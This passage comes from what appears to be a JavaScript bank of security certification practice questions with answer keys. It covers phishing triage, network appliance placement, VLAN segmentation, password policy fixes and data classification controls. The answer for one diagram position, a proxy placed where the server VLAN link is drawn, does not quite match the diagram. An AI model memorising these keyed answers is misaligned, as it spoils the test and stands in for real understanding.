    7: ["Reset alee's password and revoke sessions (credentials were captured)","No action — MFA blocked it","Disable alee's MFA","Ban alee from email"],
    8: ["Purge the email from all mailboxes and block the phishing domain","Wait for more reports","Only block the sender's display name","Turn off the proxy"]
  },
  rows: [
    { l: "alee", a: ["Submitted credentials"], w: "POSTed to the fake login. The attacker tried them, but the MFA push was denied." },
    { l: "bkhan", a: ["Received only"], w: "No click events." },
    { l: "cdiaz", a: ["Clicked (no credentials submitted)"], w: "GET with no POST." },
    { l: "dmoss", a: ["Account compromised"], w: "Submitted credentials AND approved the attacker's MFA push, so there's a successful foreign sign-in." },
    { l: "fpatel", a: ["Reported the phish"], w: "The good outcome. Thank and reinforce it." },
    { l: "eng", a: ["Received only"], w: "No click events." },
    { l: "Action for dmoss", a: ["Revoke sessions, reset password, re-register MFA, review mailbox rules for dmoss"], w: "Attackers often add mail-forwarding rules after a takeover." },
    { l: "Action for alee", a: ["Reset alee's password and revoke sessions (credentials were captured)"], w: "The password is known to the attacker even though MFA held." },
    { l: "Campaign-wide action", a: ["Purge the email from all mailboxes and block the phishing domain"], w: "Remove the lure for everyone who hasn't clicked yet." }
  ],
  explain: "GET = clicked. POST = submitted credentials. A successful IdP sign-in from the attacker = compromised. MFA fatigue (approving a push you didn't start) turns a 'submitted' into a 'compromised'."
},

// ======================= NETWORK BUILD =======================
{
  id: "build-network", domain: 3, time: 6, type: "grid", level: "hard",
  title: "Build a secure network: place the appliances",
  scenario: `<p>You are building the network for a new office that hosts a public web app and has remote staff. Read the path descriptions and place the BEST appliance at each numbered position. Each appliance is used once.</p>
  <pre class="log">Internet ──[1]── Edge ──┬──[2]── [3] Web servers (DMZ)
                         │
                         ├──[4]── Core switch ──[5]── Server VLAN (DB, AD)
                         │              │
                         │              └── [6] copy of all core traffic (SPAN)
                         └──[7]── Remote staff tunnel termination

  Management VLAN ──[8]── admin access point into all server management interfaces
  Wireless: staff SSID authenticates each user against a central AAA server ──[9]</pre>`,
  task: "Choose the appliance for each position.",
  cols: ["Appliance"],
  opts: [["NGFW","WAF","Load balancer","IPS (inline)","IDS (passive sensor)","VPN concentrator","Jump server","RADIUS server","Proxy server","UTM"]],
  rows: [
    { l: "[1] Internet edge, filtering all inbound/outbound traffic with app awareness", a: ["NGFW"], w: "The perimeter boundary." },
    { l: "[2] Directly in front of the web servers, inspecting HTTP for SQLi/XSS", a: ["WAF"], w: "Layer 7 web protection." },
    { l: "[3] Spreads requests across the web server pool, with health checks", a: ["Load balancer"], w: "Availability and scalability." },
    { l: "[4] Inline between the edge and the core, blocking known exploit traffic", a: ["IPS (inline)"], w: "Inline means it can block." },
    { l: "[6] Receives a SPAN copy only, and alerts", a: ["IDS (passive sensor)"], w: "A passive sensor can't block, because it only sees a copy of the traffic." },
    { l: "[5] Filters user web access to the internet and caches content", a: ["Proxy server"], w: "A forward proxy for content filtering." },
    { l: "[7] Terminates remote staff encrypted tunnels", a: ["VPN concentrator"], w: "Remote-access VPN termination." },
    { l: "[8] Hardened single entry point for admins", a: ["Jump server"], w: "All admin sessions go through it, where they can be monitored." },
    { l: "[9] Central AAA for 802.1X wireless", a: ["RADIUS server"], w: "WPA3-Enterprise authenticates users against RADIUS." }
  ],
  explain: "Inline = IPS (can block). Tap or SPAN = IDS (alerts only). WAF goes in front of web apps. Load balancer goes in front of server pools. Jump server goes on the management network. RADIUS is the back end for 802.1X. A UTM is the all-in-one alternative for small sites, and it's the leftover distractor here."
},
{
  id: "build-segments", domain: 3, time: 5, type: "grid", level: "medium",
  title: "Build a secure network: segments and controls",
  scenario: `<p>A K-12 school is redesigning its network. Assign each device group to the BEST network segment, and choose the most important control for it.</p>`,
  task: "Choose a segment and a key control for each group.",
  cols: ["Segment","Key control"],
  opts: [["Staff VLAN","Student VLAN","Guest VLAN","IoT/OT VLAN","PCI (cardholder) segment","Server VLAN","Management VLAN"],
         ["802.1X with device certificates","Content filtering + no access to staff/server VLANs","Captive portal, internet only, client isolation","Deny all except to the NVR; no internet","Strict ACLs, encryption in transit, quarterly scans","Only reachable from specific app ports; host firewalls","Reachable only from the jump server; MFA"]],
  rows: [
    { l: "Teacher laptops (managed, need gradebook + file shares)", a: ["Staff VLAN","802.1X with device certificates"], w: "Authenticate managed devices before they get access." },
    { l: "Student Chromebooks", a: ["Student VLAN","Content filtering + no access to staff/server VLANs"], w: "Content filtering is required for students (e.g., CIPA), plus isolation from sensitive systems." },
    { l: "Parent/visitor phones", a: ["Guest VLAN","Captive portal, internet only, client isolation"], w: "Untrusted devices get the internet and nothing else." },
    { l: "Security cameras and HVAC controllers", a: ["IoT/OT VLAN","Deny all except to the NVR; no internet"], w: "IoT devices are weak and hard to patch, so lock them down tightly." },
    { l: "Cafeteria card payment terminals", a: ["PCI (cardholder) segment","Strict ACLs, encryption in transit, quarterly scans"], w: "Segmentation shrinks PCI DSS scope." },
    { l: "SIS database and file servers", a: ["Server VLAN","Only reachable from specific app ports; host firewalls"], w: "Least privilege between tiers." },
    { l: "Switch and firewall admin interfaces", a: ["Management VLAN","Reachable only from the jump server; MFA"], w: "Never manage infrastructure from user networks." }
  ],
  explain: "Segment by trust level and data sensitivity, then apply the control that fits each segment's specific risk: authentication for staff, filtering for students, isolation for guests and IoT, scope reduction for PCI, and a jump server plus MFA for management."
},

// ======================= POLICY / DOCUMENT REVIEW =======================
{
  id: "policy-passwords", domain: 5, time: 6, type: "grid", level: "hard",
  title: "Document review: Fix the password policy",
  scenario: `<p>You're reviewing the draft <b>Identity & Password Standard</b> against the organization's requirements. The CISO's requirements:</p>
  <ul><li>Follow current NIST SP 800-63B-style guidance: favor <b>length</b> over composition rules, screen against breached passwords, and <b>don't force periodic changes</b> unless compromise is suspected.</li>
  <li>MFA for all remote access and all admin accounts. Phishing-resistant MFA for admins.</li>
  <li>Prevent online guessing without enabling easy denial-of-service.</li></ul>
  <p>The current draft:</p>
  <pre class="log">1. Minimum length: 8 characters
2. Must contain upper, lower, number and symbol
3. Expire every 30 days
4. Password hint allowed at login
5. Lockout: after 3 failures, permanently until help desk unlocks
6. Admins: password only
7. Passwords for the HR app stored with MD5
8. Service account passwords kept in a spreadsheet on the IT share
9. Password history: none</pre>`,
  task: "Choose the corrected setting for each line.",
  cols: ["Corrected setting"],
  opts: [[""]],
  rowOpts: {
    0: ["15+ characters (allow long passphrases up to 64+)","8 characters","6 characters with complexity","4-digit PIN"],
    1: ["Remove forced composition rules; screen against breached/common passwords","Require 2 symbols","Require upper, lower, number, symbol and no dictionary words","Require a new symbol every change"],
    2: ["No scheduled expiration; force a change on evidence of compromise","Expire every 15 days","Expire every 90 days","Never allow changes"],
    3: ["Remove password hints","Allow hints visible to admins only","Allow hints but limit them to 10 characters","Email hints to users"],
    4: ["Throttle/temporarily lock after repeated failures (e.g., 10) with auto-unlock","Permanent lockout after 1 failure","No lockout or throttling","Lock all accounts in the OU"],
    5: ["Phishing-resistant MFA (FIDO2/smart card) for all admin accounts","SMS codes for admins","Longer admin passwords only","Shared admin account"],
    6: ["Salted hash with key stretching (bcrypt/PBKDF2/Argon2)","SHA-1 without salt","AES encryption with the key stored in the app","Base64 encoding"],
    7: ["Store in a PAM/secrets vault with automatic rotation","Keep in the spreadsheet but password-protect it","Email them to the admin team","Hard-code them in scripts"],
    8: ["Keep a history to prevent reuse of recent passwords","No history","Allow reuse after 1 change","History of 1"]
  },
  rows: [
    { l: "Line 1 — Minimum length", a: ["15+ characters (allow long passphrases up to 64+)"], w: "Length is the biggest factor in password strength. Allow passphrases." },
    { l: "Line 2 — Composition", a: ["Remove forced composition rules; screen against breached/common passwords"], w: "Composition rules produce predictable patterns (Password1!). Blocklists stop the common ones." },
    { l: "Line 3 — Expiration", a: ["No scheduled expiration; force a change on evidence of compromise"], w: "Frequent forced changes lead to weaker, incremented passwords." },
    { l: "Line 4 — Hints", a: ["Remove password hints"], w: "Hints leak information about the password." },
    { l: "Line 5 — Lockout", a: ["Throttle/temporarily lock after repeated failures (e.g., 10) with auto-unlock"], w: "Stops guessing without letting attackers lock everyone out permanently (a DoS)." },
    { l: "Line 6 — Admin authentication", a: ["Phishing-resistant MFA (FIDO2/smart card) for all admin accounts"], w: "Required by the CISO. SMS is the weakest MFA." },
    { l: "Line 7 — Password storage in the app", a: ["Salted hash with key stretching (bcrypt/PBKDF2/Argon2)"], w: "Never use MD5, and never store passwords in reversible encryption." },
    { l: "Line 8 — Service account passwords", a: ["Store in a PAM/secrets vault with automatic rotation"], w: "A password-protected spreadsheet is still a plaintext secrets store." },
    { l: "Line 9 — History", a: ["Keep a history to prevent reuse of recent passwords"], w: "Prevents cycling back to a known password after a compromise reset." }
  ],
  explain: "If a question says to follow NIST/current guidance, choose length + breached-password screening + MFA + no forced periodic rotation. Watch for password-protected spreadsheets, MD5 storage, permanent lockouts, and SMS MFA for admins."
},
{
  id: "policy-secure-files", domain: 3, time: 5, type: "grid", level: "hard",
  title: "Document review: Which control secures the file?",
  scenario: `<p>The data governance policy uses four labels: <b>Public</b>, <b>Internal</b>, <b>Confidential</b>, <b>Restricted</b> (regulated data: SSNs, PHI, cardholder data). Review each document and choose its label and the control that BEST protects it <i>given the threat described</i>.</p>`,
  task: "Choose a label and the best control for each document.",
  cols: ["Label","Best control"],
  opts: [["Public","Internal","Confidential","Restricted"],
         ["None beyond integrity (publish as-is)","NTFS/share permissions limited to staff","File-level encryption / rights management that travels with the file","DLP rule blocking external sharing","Hash and digitally sign the file","Tokenize the card numbers","Full-disk encryption on the laptop"]],
  rows: [
    { l: "Payroll export with employee SSNs; the risk is that it gets emailed or copied off the share", a: ["Restricted","File-level encryption / rights management that travels with the file"], w: "Share permissions stop protecting the file once a copy leaves the share. Encryption or IRM stays with the file." },
    { l: "Board meeting minutes; the risk is staff accidentally sending them to outside addresses", a: ["Confidential","DLP rule blocking external sharing"], w: "DLP inspects outbound content and labels." },
    { l: "Published product brochure; the risk is someone altering the PDF posted on partner sites", a: ["Public","Hash and digitally sign the file"], w: "Public data needs integrity, not confidentiality." },
    { l: "Staff holiday schedule on the intranet; the risk is outsiders viewing it", a: ["Internal","NTFS/share permissions limited to staff"], w: "Basic access control is proportionate here." },
    { l: "Export of customer card transactions needed by analytics without real PANs", a: ["Restricted","Tokenize the card numbers"], w: "Analytics can work with tokens, which reduces PCI scope." },
    { l: "A sales manager's laptop holding the confidential pricing model; the risk is theft of the laptop", a: ["Confidential","Full-disk encryption on the laptop"], w: "The threat is a lost or stolen device, which is data at rest." }
  ],
  explain: "Match the control to the THREAT, not just the label. Copied off the share → encryption or rights management. Accidental external send → DLP. Tampering → hash or signature. Stolen device → FDE. Analytics without real data → tokenization."
}
]);
